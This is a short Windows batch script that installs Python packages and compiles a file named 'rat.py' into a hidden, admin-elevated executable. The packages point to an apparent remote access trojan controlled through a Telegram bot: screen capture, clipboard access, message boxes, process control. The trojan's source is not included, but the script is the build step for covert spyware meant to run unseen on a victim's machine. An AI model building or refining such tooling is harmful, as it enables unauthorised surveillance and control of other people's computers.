@echo off
chcp 65001
title Installing dependencies and compiling...

echo Installing required Python packages...
pip install opencv-python psutil pymsgbox pyautogui pyperclip telebot pyinstaller pillow numpy requests pywin32

pyinstaller --onefile --noconsole --uac-admin rat.py
cls
echo Build saved in dist/.
pause
exit